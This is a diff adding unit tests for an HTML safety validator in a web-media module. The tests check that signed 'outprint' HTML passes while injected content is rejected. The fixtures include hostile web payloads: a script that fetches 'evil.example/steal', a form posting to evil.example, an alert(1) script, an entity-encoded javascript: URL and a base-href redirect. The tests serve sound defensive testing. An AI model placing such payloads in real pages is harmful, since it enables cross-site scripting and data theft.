@@ -1158,3 +1158,53 @@ describe("loadWebMedia", () => {
     await expectLoadWebMediaErrorCode(loadWebMedia("media://inbound/"), "invalid-path");
   });
 });
+
+describe("validateHostReadHtmlSafety (CLAW-FORK HIGH-1)", () => {
+  let validateHostReadHtmlSafety: typeof import("./web-media.js").validateHostReadHtmlSafety;
+
+  beforeAll(async () => {
+    ({ validateHostReadHtmlSafety, LocalMediaAccessError } = await import("./web-media.js"));
+  });
+
+  const OUTPRINT_HEAD = `<html data-theme="shadcn-dark"><head></head><body>`;
+  const OUTPRINT_BOOTSTRAP = `<script>/* Outprint interactive layer */ console.log("pan/zoom");</script>`;
+
+  function expectRejected(html: string, namePart: string) {
+    try {
+      validateHostReadHtmlSafety(Buffer.from(html, "utf-8"));
+      throw new Error("expected validateHostReadHtmlSafety to throw");
+    } catch (err) {
+      expect(err).toBeInstanceOf(LocalMediaAccessError);
+      expect((err as Error).message).toContain(namePart);
+    }
+  }
+
+  it("accepts legit outprint-rendered HTML with its inline bootstrap script", () => {
+    const html = `${OUTPRINT_HEAD}<div>chart</div>${OUTPRINT_BOOTSTRAP}</body></html>`;
+    expect(() => validateHostReadHtmlSafety(Buffer.from(html, "utf-8"))).not.toThrow();
+  });
+
+  it("rejects malicious script injected alongside outprint signature tokens", () => {
+    // Attacker copies the signature + marker but adds a second, unmarked script.
+    const html = `${OUTPRINT_HEAD}<div>chart</div>${OUTPRINT_BOOTSTRAP}<script>fetch("https://evil.example/steal")</script></body></html>`;
+    expectRejected(html, "script-tag");
+  });
+
+  it("rejects a <form> smuggled into outprint-signed HTML", () => {
+    const html = `${OUTPRINT_HEAD}<form action="https://evil.example"></form>${OUTPRINT_BOOTSTRAP}</body></html>`;
+    expectRejected(html, "form-tag");
+  });
+
+  it("rejects plain (non-outprint) HTML containing a script tag", () => {
+    expectRejected(`<html><body><script>alert(1)</script></body></html>`, "script-tag");
+  });
+
+  it("rejects HTML-entity-encoded javascript: URLs", () => {
+    const html = `<html><body><a href="&#x6a;avascript&#58;alert(1)">x</a></body></html>`;
+    expectRejected(html, "javascript-url");
+  });
+
+  it("rejects <base href> redirects", () => {
+    expectRejected(`<html><head><base href="https://evil.example/"></head></html>`, "base-href");
+  });
+});
